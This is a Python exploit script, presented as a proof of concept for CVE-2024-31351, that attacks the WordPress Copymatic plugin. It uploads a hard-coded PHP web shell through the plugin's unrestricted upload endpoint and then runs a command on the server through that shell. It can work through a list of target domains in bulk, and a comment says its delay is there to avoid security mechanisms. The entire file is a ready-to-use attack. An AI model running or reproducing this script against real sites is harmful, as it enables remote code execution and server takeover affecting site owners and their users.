import requests
import time
import argparse
import sys
from termcolor import cprint

def upload_file(target_url, file_path):
    try:
        with open(file_path, 'rb') as f:
            file_name = file_path.split('/')[-1]
            files = {'file': (file_name, f, 'application/x-php')}
            response = requests.post(target_url, files=files)
        return response
    except requests.exceptions.RequestException as e:
        cprint(f"[-] Error during request: {e}", "red")
        return None

def execute_payload(exploit_url):
    try:
        response = requests.get(exploit_url)
        return response.text
    except requests.exceptions.RequestException as e:
        cprint(f"[-] Error during execution: {e}", "red")
        return None

def process_target(target_url, file_path, output_file=None):
    upload_path = "/wp-content/plugins/copymatic/upload.php"
    
    if not target_url.startswith(('http://', 'https://')):
        target_url = "http://" + target_url
    
    full_target_url = f"{target_url.rstrip('/')}{upload_path}"

    cprint(f"[+] Uploading file to {full_target_url}", "yellow")
    upload_response = upload_file(full_target_url, file_path)
    
    if upload_response and upload_response.status_code == 200:
        result = f"[+] File uploaded successfully to {full_target_url}"
        cprint(result, "green")
    else:
        result = f"[-] File upload failed: {upload_response.status_code if upload_response else 'No response'}"
        cprint(result, "red")
        return
    
    if output_file:
        with open(output_file, 'a', encoding='utf-8') as f:
            f.write(result + '\n')

    exploit_path = "/wp-content/uploads/"
    command = "id"
    
    exploit_url = f"{target_url.rstrip('/')}{exploit_path}{file_path.split('/')[-1]}?cmd={command}"
    cprint(f"[+] Executing command at {exploit_url}", "yellow")
    command_output = execute_payload(exploit_url)
    
    if command_output:
        result = f"[+] Command output:\n{command_output}"
        cprint(result, "green")
    else:
        result = f"[-] Failed to execute command at {exploit_url}"
        cprint(result, "red")
    
    if output_file:
        with open(output_file, 'a', encoding='utf-8') as f:
            f.write(result + '\n')

def main():
    parser = argparse.ArgumentParser(description="CVE-2024-31351 PoC - Unrestricted File Upload Exploit")
    
    parser.add_argument('-u', '--url', help="Target domain where the file will be uploaded (e.g., example.com)")
    parser.add_argument('-f', '--file', help="Path to the file containing multiple target domains")
    parser.add_argument('-o', '--output', help="Output file to save the results")

    if len(sys.argv) == 1:
        parser.print_help(sys.stderr)
        sys.exit(1)
    
    args = parser.parse_args()

    file_path = "shell.php"  # 硬编码的恶意文件路径

    if args.url:
        process_target(args.url, file_path, args.output)
    elif args.file:
        with open(args.file, 'r') as target_file:
            targets = target_file.readlines()
            for target in targets:
                target = target.strip()
                if target:
                    process_target(target, file_path, args.output)
                    time.sleep(1)  # 增加延迟，避免触发安全机制
    else:
        cprint("[-] Please provide either a URL or a file containing URLs.", "red")
        sys.exit(1)

if __name__ == "__main__":
    main()








